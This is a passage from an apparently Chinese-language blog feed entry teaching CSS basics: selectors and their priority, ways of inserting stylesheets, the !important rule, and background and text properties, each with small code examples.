class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123;<span class="hljs-attribute">text-align</span>:center;&#125;<br></code></pre></div></td></tr></table></figure><p>也可以指定特定的 HTML 元素使用 class。<br>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/*类名的第一个字符不能使用数字！*/</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.center</span> &#123;<span class="hljs-attribute">text-align</span>:center;&#125;<span class="hljs-comment">/*所有的 p 元素使用 class=&quot;center&quot; 让该元素的文本居中*/</span><br></code></pre></div></td></tr></table></figure><h3 id="2-3-标签选择器"><a href="#2-3-标签选择器" class="headerlink" title="2.3 标签选择器"></a>2.3 标签选择器</h3><p>标签选择器，即以 HTML 标签作为 CSS 修饰所用的选择器。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;style&gt;<br><span class="hljs-selector-tag">h3</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;<br>&lt;/style&gt;<br>&lt;<span class="hljs-selector-tag">h3</span>&gt;CSS教程&lt;/<span class="hljs-selector-tag">h3</span>&gt;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-内联选择器"><a href="#2-4-内联选择器" class="headerlink" title="2.4 内联选择器"></a>2.4 内联选择器</h3><p>内联选择器，即直接在标签内部写 CSS 代码。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;h3 style=&quot;color:red;&quot;&gt;CSS教程&lt;/h3&gt;<br></code></pre></div></td></tr></table></figure><p>这四种 选择器有修饰上的优先级，即：</p><p>内联选择器 &gt; id选择器 &gt; 类选择器 &gt; 标签选择器</p><h2 id="3-CSS创建"><a href="#3-CSS创建" class="headerlink" title="3.CSS创建"></a>3.CSS创建</h2><h3 id="3-1插入样式表"><a href="#3-1插入样式表" class="headerlink" title="3.1插入样式表"></a>3.1插入样式表</h3><blockquote><ul><li>外部样式表</li><li>内部样式表</li><li>内联样式</li></ul></blockquote><h4 id="3-1-1-外部样式表"><a href="#3-1-1-外部样式表" class="headerlink" title="3.1.1 外部样式表"></a>3.1.1 外部样式表</h4><p>当样式需要应用于很多页面时，外部样式表将是理想的选择。在使用外部样式表的情况下，你可以通过改变一个文件来改变整个站点的外观。每个页面使用 标签链接到样式表。 标签在（文档的）头部。如：&lt;head&gt; &lt;link rel=”stylesheet” type=”text/css” href=”mystyle.css”&gt; &lt;/head&gt;</p><p>浏览器会从文件 mystyle.css 中读到样式声明，并根据它来格式文档。<br>外部样式表可以在任何文本编辑器中进行编辑。文件不能包含任何的 html 标签。样式表应该以 .CSS 扩展名进行保存。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">hr &#123;<span class="hljs-attribute">color</span>:sienna;&#125;            <br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">margin-left</span>:<span class="hljs-number">20px</span>;&#125;            <br><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">/images/back40.gif</span>);&#125;<br></code></pre></div></td></tr></table></figure><p><strong>不要在属性值与单位之间留有空格。</strong></p><h4 id="3-1-2-内部样式表"><a href="#3-1-2-内部样式表" class="headerlink" title="3.1.2 内部样式表"></a>3.1.2 内部样式表</h4><p>当单个文档需要特殊的样式时，就应该使用内部样式表。你可以使用 &lt;style&gt; 标签在文档头部定义内部样式表。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;head&gt;<br>&lt;style&gt;<br>hr &#123;<span class="hljs-attribute">color</span>:sienna;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">margin-left</span>:<span class="hljs-number">20px</span>;&#125;<br><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;images/back40.gif&quot;</span>);&#125;<br>&lt;/style&gt;<br>&lt;/head&gt;<br></code></pre></div></td></tr></table></figure><h4 id="3-1-3-内联样式"><a href="#3-1-3-内联样式" class="headerlink" title="3.1.3 内联样式"></a>3.1.3 内联样式</h4><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。</p><p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。</p><p>使用实例：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;p style=&quot;color:sienna;margin-left:20px&quot;&gt;这是一个段落。&lt;/p&gt;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-多重样式表"><a href="#3-2-多重样式表" class="headerlink" title="3.2 多重样式表"></a>3.2 多重样式表</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。</p><p>例如：<br>外部样式表拥有针对 H3 选择器的三个属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h3</span>&#123;        <br><span class="hljs-attribute">color</span>:red;        <br><span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:left</span>;     <br><span class="hljs-attribute">font-size</span>:<span class="hljs-number">8pt</span>;    <br>&#125;<br></code></pre></div></td></tr></table></figure><p>内部样式表拥有针对 H3 选择器的两个属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h3</span>&#123;        <br><span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>;        <br><span class="hljs-attribute">font-size</span>:<span class="hljs-number">20pt</span>;     <br>&#125;<br></code></pre></div></td></tr></table></figure><p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 H3 得到的样式是：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">color</span>:red; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>;<br><span class="hljs-attribute">font-size</span>:<span class="hljs-number">20pt</span>;<br></code></pre></div></td></tr></table></figure><p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p><h4 id="3-2-1-多重样式优先级顺序"><a href="#3-2-1-多重样式优先级顺序" class="headerlink" title="3.2.1 多重样式优先级顺序"></a>3.2.1 多重样式优先级顺序</h4><p>优先级逐级增加的选择器列表：</p><ol><li>通用选择器（*）</li><li>元素(类型)选择器</li><li>类选择器</li><li>属性选择器</li><li>伪类</li><li>ID 选择器</li><li>内联样式</li></ol><h3 id="3-3-important-规则例外"><a href="#3-3-important-规则例外" class="headerlink" title="3.3 !important 规则例外"></a>3.3 !important 规则例外</h3><p>当 !important 规则被应用在一个样式声明中时，该样式声明会覆盖 CSS 中任何其他的声明，即优先级最高，无论它处在声明列表中的哪里。尽管如此，!important 规则还是与优先级毫无关系。使用 !important 不是一个好习惯，因为它改变了你样式表本来的级联规则，从而使其难以调试。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#Box</span> &#123;<br><span class="hljs-attribute">color</span>:red <span class="hljs-meta">!important</span>;<br><span class="hljs-attribute">color</span>:blue;<br>&#125;<br><br><span class="hljs-selector-id">#box</span> &#123;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">30px</span><span class="hljs-meta">!important</span>;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">18px</span>;<br><span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-4-CSS优先级法则"><a href="#3-4-CSS优先级法则" class="headerlink" title="3.4 CSS优先级法则"></a>3.4 CSS优先级法则</h3><ul><li>A 选择器都有一个权值，权值越大越优先；</li><li>B 当权值相等时，后出现的样式表设置要优于先出现的样式表设置；</li><li>C 创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式；</li><li>D 继承的 CSS 样式不如后来指定的 CSS 样式；</li><li>E 在同一组属性设置中标有 “!important” 规则的优先级最大；</li></ul><h2 id="4-背景（Backgrounds）"><a href="#4-背景（Backgrounds）" class="headerlink" title="4.背景（Backgrounds）"></a>4.背景（Backgrounds）</h2><p>CSS 背景属性用于定义 HTML 元素的背景。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">background</td><td align="center">简写属性，作用是将背景属性设置在一个声明中。</td></tr><tr><td align="center">background-attachment</td><td align="center">背景图像是否固定或者随着页面的其余部分滚动。</td></tr><tr><td align="center">background-color</td><td align="center">设置元素的背景颜色。</td></tr><tr><td align="center">background-image</td><td align="center">把图像设置为背景。</td></tr><tr><td align="center">background-position</td><td align="center">设置背景图像的起始位置。</td></tr><tr><td align="center">background-repeat</td><td align="center">设置背景图像是否及如何重复。</td></tr></tbody></table><h3 id="4-1-背景颜色（background-color）"><a href="#4-1-背景颜色（background-color）" class="headerlink" title="4.1 背景颜色（background-color）"></a>4.1 背景颜色（background-color）</h3><p>定义了元素的背景颜色。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0c4de</span>;&#125;<br><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#6495ed</span>;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#e0ffff</span>;&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0c4de</span>;&#125;<br></code></pre></div></td></tr></table></figure><p><strong>提示：</strong>background-color 不能继承，其默认值是 transparent。如果一个元素没有指定背景色，那么背景就是透明的，这样其父元素的背景才可见。</p><h3 id="4-2-背景图像（background-image）"><a href="#4-2-背景图像（background-image）" class="headerlink" title="4.2 背景图像（background-image）"></a>4.2 背景图像（background-image）</h3><p>描述了元素的背景图像。默认情况下，背景图像进行平铺重复显示，以覆盖整个元素实体。</p><p>使用实例：页面背景图片设置</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;paper.gif&#x27;</span>);&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-2-1-水平或垂直平铺"><a href="#4-2-1-水平或垂直平铺" class="headerlink" title="4.2.1 水平或垂直平铺"></a>4.2.1 水平或垂直平铺</h4><p>如果需要在 HTML 页面上对背景图像进行平铺，可以使用 background-repeat 属性。默认情况下 background-image 属性会在页面的水平或者垂直方向平铺。</p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">repeat</td><td align="center">默认。背景图像将在垂直方向和水平方向重复。</td></tr><tr><td align="center">repeat-x</td><td align="center">背景图像将在水平方向重复。</td></tr><tr><td align="center">repeat-y</td><td align="center">背景图像将在垂直方向重复。</td></tr><tr><td align="center">no-repeat</td><td align="center">背景图像将仅显示一次。</td></tr><tr><td align="center">inherit</td><td align="center">规定应该从父元素继承 background-repeat 属性的设置。</td></tr></tbody></table><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;gradient2.png&#x27;</span>); &#125;<br></code></pre></div></td></tr></table></figure><p>使用实例2：只在水平方向平铺 (repeat-x) </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;gradient2.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:repeat-x;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-2-2-设置定位与不平铺"><a href="#4-2-2-设置定位与不平铺" class="headerlink" title="4.2.2 设置定位与不平铺"></a>4.2.2 设置定位与不平铺</h4><p>如果不想让图像平铺，可以使用 background-repeat 属性:</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>利用 background-position 属性改变图像在背景中的位置:</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br><span class="hljs-attribute">background-position</span><span class="hljs-selector-pseudo">:right</span> <span class="hljs-attribute">top</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>background-position 属性提供值有很多方法。首先，可以使用一些关键字：top、bottom、left、right 和 center；其次，可以使用长度值，如 100px 或 5cm；最后也可以使用百分数值。不同类型的值对于背景图像的放置稍有差异。</p><h5 id="4-2-2-1-关键字"><a href="#4-2-2-1-关键字" class="headerlink" title="4.2.2.1 关键字"></a>4.2.2.1 关键字</h5><p>图像放置关键字最容易理解的作用就像其名字的意义。例如，top left 使图像放置在元素内边距区的左上角。只要保证不超过两个关键字：一个对应水平方向，另一个对应垂直方向，那么你可以设置位置关键字以任何顺序出现。如果只有一个关键字，则会默认另一个关键字为 center。</p><p>如果希望每个段落的中部上方出现一个图像，使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);        <br><span class="hljs-attribute">background-repeat</span>:no-repeat;            <br><span class="hljs-attribute">background-position</span>:top;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="4-2-2-2-百分数值"><a href="#4-2-2-2-百分数值" class="headerlink" title="4.2.2.2 百分数值"></a>4.2.2.2 百分数值</h5><p>百分数值的表现方式更为复杂。<br>若希望用百分数值将图像在其元素中居中，使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);  <br><span class="hljs-attribute">background-repeat</span>:no-repeat;    <br><span class="hljs-attribute">background-position</span>:<span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>若想把一个图像放在水平方向 2/3、垂直方向 1/3 处：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);   <br><span class="hljs-attribute">background-repeat</span>:no-repeat;   <br><span class="hljs-attribute">background-position</span>:<span class="hljs-number">66%</span> <span class="hljs-number">33%</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="4-2-2-3-长度值"><a href="#4-2-2-3-长度值" class="headerlink" title="4.2.2.3 长度值"></a>4.2.2.3 长度值</h5><p>长度值解释的是元素内边距区左上角的偏移，偏移点是图像的左上角。</p><p>如果设置值为 50px 100px，图像的左上角将在元素内边距区左上角向右 50 像素、向下 100 像素的位置上：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br><span class="hljs-attribute">background-position</span>:<span class="hljs-number">50px</span> <span class="hljs-number">100px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>这一点与百分数值不同，因为偏移只是从一个左上角到另一个左上角。也就是说，图像的左上角与 background-position 声明中的指定的点对齐。</p><h4 id="4-2-3-简写属性"><a href="#4-2-3-简写属性" class="headerlink" title="4.2.3 简写属性"></a>4.2.3 简写属性</h4><p>为了简化这些属性的代码，可以将这些属性合并在同一个属性中。背景颜色的简写属性为 “background”:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background</span>:<span class="hljs-number">#ffffff</span> <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>) no-repeat right top;&#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>使用简写属性时，属性值的顺序为：</p><blockquote><ol><li>background-color</li><li>background-image</li><li>background-repeat</li><li>background-attachment</li><li>background-position</li></ol></blockquote><p>以上属性无需全部使用，可以按照页面的实际需要使用。</p><h2 id="5-文本（text）"><a href="#5-文本（text）" class="headerlink" title="5. 文本（text）"></a>5. 文本（text）</h2><p>通过 CSS 的 Text 属性，你可以改变页面中文本的颜色、字符间距、对齐文本、装饰文本、对文本进行缩进等等。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">color</td><td align="center">设置文本颜色</td></tr><tr><td align="center">direction</td><td align="center">设置文本方向。</td></tr><tr><td align="center">letter-spacing</td><td align="center">设置字符间距</td></tr><tr><td align="center">line-height</td><td align="center">设置行高</td></tr><tr><td align="center">text-align</td><td align="center">对齐元素中的文本</td></tr><tr><td align="center">text-decoration</td><td align="center">向文本添加修饰</td></tr><tr><td align="center">text-indent</td><td align="center">缩进元素中文本的首行</td></tr><tr><td align="center">text-shadow</td><td align="center">设置文本阴影</td></tr><tr><td align="center">text-transform</td><td align="center">控制元素中的字母</td></tr><tr><td align="center">unicode-bidi</td><td align="center">设置或返回文本是否被重写</td></tr><tr><td align="center">vertical-align</td><td align="center">设置元素的垂直对齐</td></tr><tr><td align="center">white-space</td><td align="center">设置元素中空白的处理方式</td></tr><tr><td align="center">word-spacing</td><td align="center">设置字间距</td></tr></tbody></table><h3 id="5-1-颜色（color）"><a href="#5-1-颜色（color）" class="headerlink" title="5.1 颜色（color）"></a>5.1 颜色（color）</h3><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;<br><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#00ff00</span>;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-built_in">rgb</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);&#125;<br></code></pre></div></td></tr></table></figure><p>对于 W3C 标准的 CSS：如果你定义了颜色属性，你还必须定义背景色属性。</p><h3 id="5-2-文本的对齐方式（text-align）"><a href="#5-2-文本的对齐方式（text-align）" class="headerlink" title="5.2 文本的对齐方式（text-align）"></a>5.2 文本的对齐方式（text-align）</h3><p>文本排列属性是用来设置文本的水平对齐方式。文本可居中或对齐到左或右,两端对齐。</p><p>当 text-align 设置为justify，每一行被展开为宽度相等，左，右外边距是对齐（如杂志和报纸）。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">text-align</span>:center;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.date</span> &#123;<span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.main</span> &#123;<span class="hljs-attribute">text-align</span>:justify;&#125;<br></code></pre></div></td></tr></table></figure><p>如果想把一个行内元素的第一行“缩进”，可以用左内边距或外边距创造这种效果。</p><h3 id="5-3-文本修饰（text-decoration）"><a href="#5-3-文本修饰（text-decoration）" class="headerlink" title="5.3 文本修饰（text-decoration）"></a>5.3 文本修饰（text-decoration）</h3><p>text-decoration属性用来设置或删除文本的装饰。从设计的角度看 text-decoration 属性主要是用来删除链接的下划线。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">text-decoration</span>:none;&#125;<br></code></pre></div></td></tr></table></figure><p>也可以这样装饰文字。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">text-decoration</span>:overline;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">text-decoration</span>:line-through;&#125;<br><span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">text-decoration</span>:underline;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-4-文本转换（text-transform）"><a href="#5-4-文本转换（text-transform）" class="headerlink" title="5.4 文本转换（text-transform）"></a>5.4 文本转换（text-transform）</h3><p>文本转换属性是用来指定在一个文本中的大写和小写字母。可用于所有字句变成大写或小写字母，或每个单词的首字母大写。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.uppercase</span> &#123;<span class="hljs-attribute">text-transform</span>:uppercase;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.lowercase</span> &#123;<span class="hljs-attribute">text-transform</span>:lowercase;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.capitalize</span> &#123;<span class="hljs-attribute">text-transform</span>:capitalize;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-5-文本缩进（text-indent）"><a href="#5-5-文本缩进（text-indent）" class="headerlink" title="5.5 文本缩进（text-indent）"></a>5.5 文本缩进（text-indent）</h3><p>文本缩进属性是用来指定文本的第一行的缩进。CSS 提供了 text-indent 属性，该属性可以方便地实现文本缩进。通过使用 text-indent 属性，所有元素的第一行都可以缩进一个给定的长度。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">text-indent</span>:<span class="hljs-number">50px</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-6-文本间隔（word-spacing）"><a href="#5-6-文本间隔（word-spacing）" class="headerlink" title="5.6 文本间隔（word-spacing）"></a>5.6 文本间隔（word-spacing）</h3><p>word-spacing 属性可以改变字（单词）之间的标准间隔。其默认值 normal 与设置值为 0 是一样的。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">word-spacing</span>:<span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（四）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
